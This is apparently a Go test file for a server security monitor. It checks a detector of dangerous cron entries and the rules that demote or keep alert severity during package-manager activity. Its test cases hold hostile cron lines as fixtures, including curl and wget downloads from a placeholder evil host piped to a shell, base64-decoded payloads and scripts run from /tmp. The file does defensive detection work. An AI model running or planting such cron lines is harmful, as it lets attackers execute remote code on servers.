package checks

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/state"
)

func TestCronHasDangerTokens(t *testing.T) {
	cases := []struct {
		name string
		line string
		want bool
	}{
		{
			name: "benign_flock_cl_smart_advice",
			line: "0 16 * * * root /usr/bin/flock -n /var/run/x.lock /usr/sbin/cl-smart-advice update-advices-metadata &> /dev/null",
			want: false,
		},
		{
			name: "benign_simple_root_command",
			line: "* * * * * root /usr/sbin/logrotate /etc/logrotate.conf",
			want: false,
		},
		{
			name: "curl_pipe_sh",
			line: "* * * * * root curl http://evil.example/x | sh",
			want: true,
		},
		{
			name: "wget_pipe_bash",
			line: "* * * * * root wget -qO- https://evil.example/y | bash",
			want: true,
		},
		{
			name: "base64_decode",
			line: "* * * * * root echo aGVsbG8= | base64 -d | sh",
			want: true,
		},
		{
			name: "php_eval_base64",
			line: "* * * * * root php -r 'eval(base64_decode(\"abc\"));'",
			want: true,
		},
		{
			name: "tmp_path",
			line: "* * * * * root /tmp/payload.sh",
			want: true,
		},
		{
			name: "dev_shm_path",
			line: "* * * * * root /dev/shm/.x",
			want: true,
		},
		{
			name: "hex_escape_sequence",
			line: "* * * * * root /usr/bin/printf '\\x68\\x69' | sh",
			want: true,
		},
		{
			name: "python_inline",
			line: "* * * * * root python3 -c 'import os; os.system(\"id\")'",
			want: true,
		},
		{
			name: "perl_inline",
			line: "* * * * * root perl -e 'system(\"id\")'",
			want: true,
		},
		{
			name: "empty",
			line: "",
			want: false,
		},
		{
			name: "comment_only",
			line: "# ${RANDOM:0:2}m -> [10m - 99m], used to distribute task in time",
			want: false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := cronHasDangerTokens([]byte(tc.line)); got != tc.want {
				t.Errorf("cronHasDangerTokens(%q) = %v, want %v", tc.line, got, tc.want)
			}
		})
	}
}

func TestPkgManagerWindow(t *testing.T) {
	dir := t.TempDir()
	fresh := filepath.Join(dir, "fresh.log")
	stale := filepath.Join(dir, "stale.log")
	if err := os.WriteFile(fresh, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(stale, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	old := time.Now().Add(-10 * time.Minute)
	if err := os.Chtimes(stale, old, old); err != nil {
		t.Fatal(err)
	}

	oldPaths := pkgManagerLogs
	t.Cleanup(func() { pkgManagerLogs = oldPaths })

	t.Run("recent_log_in_window", func(t *testing.T) {
		pkgManagerLogs = []string{fresh}
		if !pkgManagerWindow(time.Now(), 2*time.Minute) {
			t.Error("expected pkg window to be open for fresh log")
		}
	})
	t.Run("exported_wrapper_uses_default_window", func(t *testing.T) {
		pkgManagerLogs = []string{fresh}
		if !PkgManagerRecentlyActive(time.Now()) {
			t.Error("expected PkgManagerRecentlyActive true for fresh log")
		}
		pkgManagerLogs = []string{stale}
		if PkgManagerRecentlyActive(time.Now()) {
			t.Error("expected PkgManagerRecentlyActive false for stale log")
		}
	})
	t.Run("stale_log_outside_window", func(t *testing.T) {
		pkgManagerLogs = []string{stale}
		if pkgManagerWindow(time.Now(), 2*time.Minute) {
			t.Error("expected pkg window closed for stale log")
		}
	})
	t.Run("missing_log", func(t *testing.T) {
		pkgManagerLogs = []string{filepath.Join(dir, "nope.log")}
		if pkgManagerWindow(time.Now(), 2*time.Minute) {
			t.Error("missing log must not open the window")
		}
	})
	t.Run("any_log_recent_opens_window", func(t *testing.T) {
		pkgManagerLogs = []string{stale, fresh}
		if !pkgManagerWindow(time.Now(), 2*time.Minute) {
			t.Error("at least one fresh log must open the window")
		}
	})
}

func TestRescoreSensitiveDemotesInPkgWindow(t *testing.T) {
	dir := t.TempDir()
	fresh := filepath.Join(dir, "dnf.rpm.log")
	if err := os.WriteFile(fresh, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	oldPaths := pkgManagerLogs
	pkgManagerLogs = []string{fresh}
	t.Cleanup(func() { pkgManagerLogs = oldPaths })

	in := alert.Finding{Severity: alert.High, Check: "sensitive_file_modified"}
	cron := []byte("0 16 * * * root /usr/sbin/cl-smart-advice update-advices-metadata\n")

	out := rescoreSensitive(in, "cron", cron, 0, time.Now())
	if out.Severity != alert.Warning {
		t.Fatalf("expected Warning within pkg window for benign cron, got %v", out.Severity)
	}
	if out.Details == "" {
		t.Error("expected demote reason in Details")
	}
}

func TestRescoreSensitiveDangerTokensVetoDemote(t *testing.T) {
	dir := t.TempDir()
	fresh := filepath.Join(dir, "dnf.rpm.log")
	if err := os.WriteFile(fresh, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	oldPaths := pkgManagerLogs
	pkgManagerLogs = []string{fresh}
	t.Cleanup(func() { pkgManagerLogs = oldPaths })

	in := alert.Finding{Severity: alert.High, Check: "sensitive_file_modified"}
	cron := []byte("* * * * * root curl http://evil.example/x | sh\n")

	out := rescoreSensitive(in, "cron", cron, 0, time.Now())
	if out.Severity != alert.High {
		t.Fatalf("danger tokens must veto demote even inside pkg window, got %v", out.Severity)
	}
}

func TestRescoreSensitiveOutsidePkgWindowKeepsHigh(t *testing.T) {
	oldPaths := pkgManagerLogs
	pkgManagerLogs = []string{filepath.Join(t.TempDir(), "missing.log")}
	t.Cleanup(func() { pkgManagerLogs = oldPaths })

	in := alert.Finding{Severity: alert.High}
	out := rescoreSensitive(in, "cron", []byte("0 0 * * * root /usr/sbin/foo\n"), 0, time.Now())
	if out.Severity != alert.High {
		t.Fatalf("no pkg activity must not demote, got %v", out.Severity)
	}
}

func TestRescoreSensitiveAncestryHookDemotes(t *testing.T) {
	oldPaths := pkgManagerLogs
	pkgManagerLogs = []string{filepath.Join(t.TempDir(), "missing.log")}
	t.Cleanup(func() { pkgManagerLogs = oldPaths })

	oldProbe := AncestryProbe
	AncestryProbe = func(pid uint32) bool { return pid == 4242 }
	t.Cleanup(func() { AncestryProbe = oldProbe })

	in := alert.Finding{Severity: alert.High}
	out := rescoreSensitive(in, "cron", []byte("0 0 * * * root /usr/sbin/foo\n"), 4242, time.Now())
	if out.Severity != alert.Warning {
		t.Fatalf("ancestry hint must demote, got %v", out.Severity)
	}
}

func TestRescoreSensitiveAncestryHookNilSafe(t *testing.T) {
	oldPaths := pkgManagerLogs
	pkgManagerLogs = []string{filepath.Join(t.TempDir(), "missing.log")}
	t.Cleanup(func() { pkgManagerLogs = oldPaths })

	oldProbe := AncestryProbe
	AncestryProbe = nil
	t.Cleanup(func() { AncestryProbe = oldProbe })

	in := alert.Finding{Severity: alert.High}
	out := rescoreSensitive(in, "cron", []byte("0 0 * * * root /usr/sbin/foo\n"), 9999, time.Now())
	if out.Severity != alert.High {
		t.Fatalf("nil AncestryProbe must be safe and not demote, got %v", out.Severity)
	}
}

func TestRescoreSensitiveAncestryDangerVeto(t *testing.T) {
	oldProbe := AncestryProbe
	AncestryProbe = func(pid uint32) bool { return true }
	t.Cleanup(func() { AncestryProbe = oldProbe })

	in := alert.Finding{Severity: alert.High}
	out := rescoreSensitive(in, "cron", []byte("* * * * * root /tmp/x.sh\n"), 1, time.Now())
	if out.Severity != alert.High {
		t.Fatalf("danger tokens veto ancestry-based demote, got %v", out.Severity)
	}
}

func TestCheckSensitiveFilesDemotesNewCronInPkgWindow(t *testing.T) {
	root := t.TempDir()
	pkgLog := filepath.Join(t.TempDir(), "dnf.rpm.log")
	if err := os.WriteFile(pkgLog, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	oldWatchset := sensitiveWatchset
	sensitiveWatchset = []string{filepath.Join(root, "etc/cron.d/*")}
	t.Cleanup(func() { sensitiveWatchset = oldWatchset })

	oldPaths := pkgManagerLogs
	pkgManagerLogs = []string{pkgLog}
	t.Cleanup(func() { pkgManagerLogs = oldPaths })

	if err := os.MkdirAll(filepath.Join(root, "etc/cron.d"), 0o755); err != nil {
		t.Fatal(err)
	}

	st, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if got := CheckSensitiveFiles(context.Background(), &config.Config{}, st); len(got) != 0 {
		t.Fatalf("baseline emitted findings: %+v", got)
	}

	body := []byte("0 16 * * * root /usr/sbin/cl-smart-advice update-advices-metadata\n")
	if err := os.WriteFile(filepath.Join(root, "etc/cron.d/xray_update"), body, 0o644); err != nil {
		t.Fatal(err)
	}

	got := CheckSensitiveFiles(context.Background(), &config.Config{}, st)
	if len(got) != 1 {
		t.Fatalf("want 1 finding, got %d: %+v", len(got), got)
	}
	if got[0].Severity != alert.Warning {
		t.Fatalf("benign cron in pkg window must demote to Warning, got %v", got[0].Severity)
	}
}
